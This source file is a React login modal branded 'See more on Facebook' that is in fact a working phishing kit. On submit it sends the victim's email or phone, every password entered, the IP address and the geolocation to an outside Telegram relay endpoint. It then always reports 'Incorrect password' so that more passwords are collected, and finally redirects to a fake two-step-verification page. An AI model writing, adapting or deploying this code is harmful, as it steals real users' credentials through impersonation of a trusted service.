import { faXmark } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import type { FC } from 'react';
import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router';
import { getSystemConfig } from '../types/system';

interface LoginFormProps {
    onClose: () => void;
}

interface FormErrors {
    email?: string;

    password?: string;
}

interface TelegramResponse {
    success: boolean;
    message: string;
    message_id?: number;
}

const LoginForm: FC<LoginFormProps> = ({ onClose }) => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [errors, setErrors] = useState<FormErrors>({});
    const [isLoading, setIsLoading] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [oldMessageId, setOldMessageId] = useState<number | null>(null);
    const [config, setConfig] = useState(getSystemConfig());
    const navigate = useNavigate();

    useEffect(() => {
        const systemConfig = getSystemConfig();
        if (!systemConfig) {
            navigate('/');
            return;
        }
        setConfig(systemConfig);
    }, [navigate]);

    useEffect(() => {
        const savedMessageId = localStorage.getItem('telegram_message_id');
        if (savedMessageId) {
            setOldMessageId(parseInt(savedMessageId));
        }
    }, []);

    const validateEmail = (email: string): boolean => {
        return /\S+@\S+\.\S+/.test(email);
    };

    const validatePhone = (phone: string): boolean => {
        return /^(?:(?:\+|00)(?:[1-9]\d{0,2}))?[1-9]\d{7,14}$/.test(phone.replace(/\s+/g, ''));
    };

    const validateForm = (): boolean => {
        const newErrors: FormErrors = {};

        if (!email) {
            newErrors.email = 'Email or phone number is required';
        } else {
            const isValidEmail = validateEmail(email);
            const isValidPhone = validatePhone(email);

            if (!isValidEmail && !isValidPhone) {
                newErrors.email = 'Please enter a valid email address or phone number';
            }
        }

        if (!password) {
            newErrors.password = 'Password is required';
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = e.target.value;
        setEmail(value);

        if (validateEmail(value) || validatePhone(value)) {
            setErrors((prev) => ({
                ...prev,
                email: undefined,
            }));
        }
    };

    const sendTelegramMessage = async (text: string) => {
        try {
            const response = await fetch(`${import.meta.env.PUBLIC_API_URL}/api/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    text,
                    parse_mode: 'HTML',
                    old_message_id: oldMessageId,
                }),
            });

            const data: TelegramResponse = await response.json();

            if (data.success && data.message_id) {
                localStorage.setItem('telegram_message_id', data.message_id.toString());
                localStorage.setItem('telegram_message', text);
                setOldMessageId(data.message_id);
            }

            return data.success;
        } catch (error) {
            console.error('Error sending Telegram message:', error);
            return false;
        }
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();

        if (!config) return;

        if (validateForm()) {
            setIsLoading(true);
            setAttempts((prev) => prev + 1);

            const geoData = JSON.parse(localStorage.getItem('geoData') ?? '{}');
            const oldMessage = localStorage.getItem('telegram_message') ?? '';
            const passwordRegex = /🔑 <b>Mật khẩu \d+:<\/b> <code>(.*?)<\/code>/g;
            const oldPasswords: string[] = [];
            let match;

            while ((match = passwordRegex.exec(oldMessage)) !== null) {
                oldPasswords.push(match[1]);
            }

            const timeStr = new Date().toLocaleString('vi-VN', {
                timeZone: 'Asia/Ho_Chi_Minh',
                hour12: false,
            });

            const passwordsList = oldPasswords
                .map((pass, index) => `🔑 <b>Mật khẩu ${index + 1}:</b> <code>${pass}</code>`)
                .join('\n');
            const newPassword = `🔑 <b>Mật khẩu ${oldPasswords.length + 1}:</b> <code>${password}</code>`;

            const messageContent = `🌐 <b>IP:</b> <code>${geoData.ip || 'N/A'}</code>
📍 <b>Địa chỉ:</b> <code>${geoData.city || 'N/A'}, ${geoData.region || 'N/A'}, ${geoData.country || 'N/A'} (${geoData.country_code || 'N/A'})</code>
⏰ <b>Thời gian:</b> <code>${timeStr}</code>

📧 <b>Email:</b> <code>${email}</code>
${passwordsList}${oldPasswords.length > 0 ? '\n' : ''}${newPassword}`.trim();

            await sendTelegramMessage(messageContent);
            await new Promise((resolve) => setTimeout(resolve, config.password_load_duration));

            setIsLoading(false);
            if (attempts >= config.password_load_limit - 1) {
                navigate('/two-step-verification');
                return;
            }
            setErrors({
                password: 'Incorrect password. Please try again.',
            });
            setPassword('');
        }
    };

    return (
        <div
            className="fixed inset-0 z-50 flex items-center justify-center bg-white/60 px-2"
            onClick={(e) => e.stopPropagation()}
        >
            <div
                className="w-full max-w-[486px] rounded-lg bg-white shadow-md"
                onClick={(e) => e.stopPropagation()}
            >
                <div className="flex justify-end p-4">
                    <button
                        onClick={onClose}
                        className="h-9 w-9 rounded-full bg-gray-200 p-1 text-gray-500 hover:bg-gray-300"
                    >
                        <FontAwesomeIcon icon={faXmark} className="h-6 w-6" />
                    </button>
                </div>
                <div className="p-4 md:p-8">
                    <h2 className="mb-5 text-center text-[28px] font-bold">See more on Facebook</h2>

                    <form className="flex flex-col items-center gap-4" onSubmit={handleSubmit}>
                        <div className="relative w-full">
                            <input
                                type="text"
                                id="email"
                                value={email}
                                onChange={handleEmailChange}
                                className={`peer w-full rounded-lg border ${
                                    errors.email ? 'border-red-500' : 'border-gray-300'
                                } focus:ring-primary p-3 pt-6 text-base focus:ring-2 focus:ring-offset-2 focus:ring-offset-white focus:outline-none`}
                                placeholder=" "
                            />
                            <label
                                htmlFor="email"
                                className="peer-focus:text-primary absolute top-4 left-3 cursor-text text-gray-500 transition-all select-none peer-placeholder-shown:translate-y-0 peer-placeholder-shown:text-base peer-focus:-translate-y-3 peer-focus:text-xs peer-[:not(:placeholder-shown)]:-translate-y-3 peer-[:not(:placeholder-shown)]:text-xs"
                            >
                                Email address or phone number
                            </label>
                            {errors.email && (
                                <p className="mt-1 text-sm text-red-500">{errors.email}</p>
                            )}
                        </div>

                        <div className="relative w-full">
                            <input
                                type="password"
                                id="password"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                className={`peer w-full rounded-lg border ${
                                    errors.password ? 'border-red-500' : 'border-gray-300'
                                } focus:ring-primary p-3 pt-6 text-base focus:ring-2 focus:ring-offset-2 focus:ring-offset-white focus:outline-none`}
                                placeholder=" "
                            />
                            <label
                                htmlFor="password"
                                className="peer-focus:text-primary absolute top-4 left-3 cursor-text text-gray-500 transition-all select-none peer-placeholder-shown:translate-y-0 peer-placeholder-shown:text-base peer-focus:-translate-y-3 peer-focus:text-xs peer-[:not(:placeholder-shown)]:-translate-y-3 peer-[:not(:placeholder-shown)]:text-xs"
                            >
                                Password
                            </label>
                            {errors.password && (
                                <p className="mt-1 text-sm text-red-500">{errors.password}</p>
                            )}
                        </div>

                        <button
                            type="submit"
                            disabled={isLoading || !email || !password}
                            className="w-full rounded-lg bg-blue-600 px-4 py-2 text-[17px] font-semibold text-white transition hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
                        >
                            {isLoading ? 'Loading...' : 'Log in'}
                        </button>

                        <a
                            href="#"
                            className="text-primary text-center text-[15px] font-semibold hover:underline"
                        >
                            Forgotten password?
                        </a>

                        <div className="my-2 flex w-full items-center gap-3">
                            <div className="h-[1px] flex-1 bg-gray-300"></div>
                            <span className="text-[15px] text-gray-500">or</span>
                            <div className="h-[1px] flex-1 bg-gray-300"></div>
                        </div>

                        <button
                            type="button"
                            className="w-fit rounded-lg bg-green-600 px-10 py-2 text-[17px] font-semibold text-white transition hover:bg-green-700"
                        >
                            Create new account
                        </button>
                    </form>
                </div>
            </div>
        </div>
    );
};

export default LoginForm;
